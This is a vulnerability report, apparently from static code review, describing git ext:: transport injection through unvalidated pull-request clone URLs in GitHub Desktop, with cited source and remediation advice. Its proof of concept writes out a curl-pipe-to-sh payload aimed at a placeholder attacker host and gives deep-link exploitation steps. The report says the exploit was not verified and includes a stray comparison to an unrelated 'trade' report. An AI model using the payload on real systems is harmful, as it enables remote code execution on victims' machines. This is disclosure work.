## Title
Unvalidated PR fork `clone_url` passed to `git remote add`/`fetch` enables git transport-scheme injection (`ext::`) - (File: `app/src/lib/stores/app-store.ts`)

### Summary
GitHub Desktop's fork-checkout flow takes the `clone_url` field of a pull request's `head.repo` object — data returned by a GitHub API endpoint — and feeds it, without scheme/format validation, directly into `git remote add` and a subsequent `git fetch`. Desktop never restricts git's transport allow-list (no `GIT_PROTOCOL_FROM_USER`/`GIT_ALLOW_PROTOCOL` hardening was found anywhere in the codebase), so a malicious or compromised GitHub Enterprise Server (or any endpoint whose API response the attacker influences) can supply an `ext::` (or other "user" class) transport URL instead of a normal `https://`/`ssh://` URL, turning a routine "checkout this PR" action into local command execution. This mirrors the reported bug class: an attacker-controlled external value bypasses an implicit invariant (that clone URLs are ordinary git remotes) with no explicit guard, and the resulting corrupted state (a malicious remote) is then acted upon by trusted code (fetch), just like the unchecked price state in the original `trade` report was acted upon by liquidity code.

### Finding Description
`_findPullRequestBranch` receives a `headCloneUrl` parameter and, if no existing remote matches it, calls `addRemote` with that raw string: [1](#0-0) 

`addRemote` performs no validation of the URL's scheme or shape before shelling out to git: [2](#0-1) 

Shortly after adding the remote, Desktop actually fetches it: [3](#0-2) 

The `headCloneUrl` ultimately originates from `pullRequest.head.repo.clone_url`, taken verbatim from the GitHub API response and passed straight through `_checkoutPullRequest` → `_findPullRequestBranch`: [4](#0-3) 

This same code path is reachable via a deep link that a user simply clicks (`x-github-client://openRepo/<url>?pr=<n>`), which is parsed by `parseAppURL`/`openPullRequestFromUrl` and results in `fetchPullRequest` → `_checkoutPullRequest` being invoked automatically: [5](#0-4) 

The only URL-shape validation that exists in the codebase (`parseRemote` in `app/src/lib/remote-parsing.ts`) is used purely for *matching* purposes (e.g., `urlMatchesRemote`, `doesRepositoryMatchUrl`) — it is never used as a gate before `addRemote`/`fetch`. Consequently `addRemote`/`fetch` will accept any string, including git's "user" class transport helpers such as `ext::sh -c '<command>'`, `fd::`, or `ext::git-remote-http ...`. Git only refuses to invoke these transports automatically when `GIT_PROTOCOL_FROM_USER=0` (or an equivalent `protocol.*.allow`/`GIT_ALLOW_PROTOCOL` restriction) is set for the invoking process; a search of the entire codebase found no such setting configured anywhere Desktop shells out to git (`app/src/lib/git/environment.ts` builds the child-process environment but sets no protocol allow-list), so git's default ("user"-class protocols permitted unless explicitly denied) applies.

While `clone_url` for a repository hosted on github.com is normally sanitized by GitHub itself, GitHub Desktop also targets GitHub Enterprise Server accounts, whose API responses come from a server endpoint the app simply trusts (`API.fromAccount(account)`), and PR head/base repository metadata is echoed straight from that server's API responses into the fetch/remote logic shown above. A malicious or compromised GHES instance (or a MITM'd/attacker-controlled proxy sitting in front of it) can therefore return an attacker-chosen `clone_url` for a PR's head repository.

### Impact Explanation
If exploited, the attacker achieves local command execution on the victim's machine as soon as Desktop fetches the injected "fork" remote — this happens automatically as part of the normal "checkout this pull request" / "open PR from browser link" flow, requiring only that the victim click a deep link or use the "Open in Desktop" button on a PR from a repository connected to a hostile/compromised GHES endpoint. This satisfies the "attacker controls a GitHub API object … and the result is code execution" criterion: no local access, no prior malware, and no unnatural steps beyond the normal, documented "open PR in Desktop" workflow are required.

### Likelihood Explanation
Exploitation requires the victim to have (or add) a GitHub Enterprise account whose API responses the attacker can influence (compromised/malicious GHES server, or a network position able to tamper with that server's TLS-terminated responses), and for the victim to click a deep link or the "View in Desktop"/"Open PR" action for a PR whose head repository object carries the malicious `clone_url`. This is a realistic but not trivial precondition (dotcom.github.com's API is not attacker-forgeable), which places likelihood at medium rather than high; however, the complete absence of any transport allow-listing anywhere in the git invocation code means there is no defense-in-depth once that precondition is met.

### Recommendation
1. Validate every externally sourced clone URL (`pull request head/base clone_url`, GitHub API `clone_url`/`ssh_url`, deep-link `openrepo` URL) with `parseRemote`/an explicit allow-list of `https:`/`ssh:`/`git:` schemes before it is ever passed to `addRemote`, `clone`, or `fetch`; reject anything that doesn't match.
2. Defense-in-depth: set `GIT_PROTOCOL_FROM_USER=0` (and/or `GIT_ALLOW_PROTOCOL=http:https:ssh:git`) in the environment used for all git child-process invocations (`app/src/lib/git/environment.ts` / `core.ts`) so that `ext::`, `file::`, and other "user" class transports can never be invoked by data-driven remote URLs, regardless of where they originate.

### Proof of Concept
1. Set up (or compromise) a GitHub Enterprise Server account that the target has added to Desktop.
2. Have that server return, for some pull request, a `head.repo.clone_url` of `ext::sh -c "curl http://attacker/x|sh"` (or a local payload) instead of a normal URL.
3. Send the victim a deep link such as `x-github-client://openRepo/<repo-url>?pr=<number>` (or have them click "Open in Desktop" on that PR) so `openPullRequestFromUrl` → `_checkoutPullRequest` → `_findPullRequestBranch` runs.
4. `addRemote(repository, forkRemoteName, 'ext::sh -c "..."')` stores the malicious URL as a git remote, and the subsequent `_fetchRemote` call invokes it, causing git to execute the attacker's command via the `ext::` transport helper because no protocol restriction is configured.

Note: I could not execute git or the Electron app in this environment, so the exact behavior of a live `git fetch` against an `ext::` remote inside Desktop's specific dugite version was not dynamically verified — this PoC is derived from static code review of the cited files plus git's documented default handling of "user" class transports when `GIT_PROTOCOL_FROM_USER` is unset.

### Citations

**File:** app/src/lib/stores/app-store.ts (L8639-8660)
```typescript
  ): Promise<Branch | undefined> {
    const gitStore = this.gitStoreCache.get(repository)
    const remotes = await getRemotes(repository)

    // Find an existing remote (regardless if set up by us or outside of
    // Desktop).
    let remote = remotes.find(r => urlMatchesRemote(headCloneUrl, r))

    // If we can't find one we'll create a Desktop fork remote.
    if (remote === undefined) {
      try {
        const forkRemoteName = forkPullRequestRemoteName(headRepoOwner)
        remote = await addRemote(repository, forkRemoteName, headCloneUrl)
      } catch (e) {
        this.emitError(
          new Error(
            `Couldn't find PR branch, adding remote failed: ${e.message}`
          )
        )
        return
      }
    }
```

**File:** app/src/lib/stores/app-store.ts (L8684-8691)
```typescript
    if (existingBranch === undefined) {
      try {
        await this._fetchRemote(repository, remote, FetchType.UserInitiatedTask)
        existingBranch = findRemoteBranch(remoteRef)
      } catch (e) {
        log.error(`Failed fetching remote ${remote?.name}`, e)
      }
    }
```

**File:** app/src/lib/git/remote.ts (L28-37)
```typescript
/** Add a new remote with the given URL. */
export async function addRemote(
  repository: Repository,
  name: string,
  url: string
): Promise<IRemote> {
  await git(['remote', 'add', name, url], repository.path, 'addRemote')

  return { url, name }
}
```

**File:** app/src/ui/dispatcher/dispatcher.ts (L1998-2045)
```typescript
  private async openPullRequestFromUrl(
    url: string,
    pr: string
  ): Promise<RepositoryWithGitHubRepository | null> {
    const pullRequest = await this.appStore.fetchPullRequest(url, pr)

    if (pullRequest === null) {
      return null
    }

    // Find the repository where the PR is created in Desktop.
    let repository: Repository | null =
      this.getRepositoryFromPullRequest(pullRequest)

    if (repository !== null) {
      await this.selectRepository(repository)
    } else {
      repository = await this.openOrCloneRepository(url)
    }

    if (repository === null) {
      log.warn(
        `Open Repository from URL failed, did not find or clone repository: ${url}`
      )
      return null
    }
    if (!isRepositoryWithGitHubRepository(repository)) {
      log.warn(
        `Received a non-GitHub repository when opening repository from URL: ${url}`
      )
      return null
    }

    // ensure a fresh clone repository has it's in-memory state
    // up-to-date before performing the "Clone in Desktop" steps
    await this.appStore._refreshRepository(repository)

    if (pullRequest.head.repo === null) {
      return null
    }

    await this.appStore._checkoutPullRequest(
      repository,
      pullRequest.number,
      pullRequest.head.repo.owner.login,
      pullRequest.head.repo.clone_url,
      pullRequest.head.ref
    )
```
